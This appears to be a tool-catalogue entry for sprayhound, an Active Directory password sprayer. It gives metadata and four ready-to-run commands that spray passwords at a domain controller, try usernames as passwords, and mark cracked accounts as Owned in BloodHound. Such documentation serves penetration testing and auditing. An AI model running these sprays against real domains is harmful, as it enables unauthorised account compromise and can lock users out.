---
name: "sprayhound"
categories:
  - blackarch-networking
version: "0.0.3"
homepage: "https://github.com/Hackndo/sprayhound"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: python
license: MIT
meta-checked: "2026-11-09"
github-repo: "Hackndo/sprayhound"
github-stars: 264
github-pushed: "2026-06-14"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 5.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 2
gh-activity-checked: "2026-11-09"
---

# sprayhound

> Lockout-aware Active Directory password sprayer that marks compromised users as Owned in BloodHound.

## What it's for

sprayhound password-sprays Active Directory accounts while respecting lockout exposure: given valid domain credentials it reads the default domain policy and each user's `badPwdCount`, then skips accounts too close to lockout (tunable via `--threshold`). Credentials it validates can be pushed to a Neo4j/BloodHound database with the affected users marked Owned, so path-to-Domain-Admin analysis starts from real footholds instead of theory. Caveat from the author: only the default domain policy is checked — custom lockout GPOs are not detected, so unauthenticated spraying can still lock accounts out.

## Typical use cases

### Spray a user list safely with domain credentials

```
sprayhound -U users.txt -p 'Spring2026!' -d corp.example.com -dc 198.51.100.10 -lu svc_audit -lp 'Password1'
```

Outcome: reads the lockout policy, skips users near their limit, sprays the listed users with the one password, and reports which accounts validated.

### Spray without credentials

```
sprayhound -U users.txt -p 'Spring2026!' -d corp.example.com -dc 198.51.100.10
```

Outcome: sprays the list against the domain controller with no policy visibility — real lockout risk; valid accounts are still reported at the end.

### Try username-as-password

```
sprayhound -U users.txt --lower -d corp.example.com -dc 198.51.100.10 -lu svc_audit -lp 'Password1'
```

Outcome: tests each user's own username (lowercased; `--upper` for the opposite) as their password, skipping near-lockout accounts — the classic stale-account check.

### Mark found credentials as Owned in BloodHound

```
sprayhound -p 'Spring2026!' -d corp.example.com -dc 198.51.100.10 -lu svc_audit -lp 'Password1' -nh 127.0.0.1 -nP 7687 -nu neo4j -np 'Password1'
```

Outcome: sprays all domain users, then connects to the Neo4j instance behind BloodHound and sets every compromised account to Owned, so BloodHound's attack-path queries immediately reflect the new footholds.

*No corpus evidence — derived from upstream documentation.*
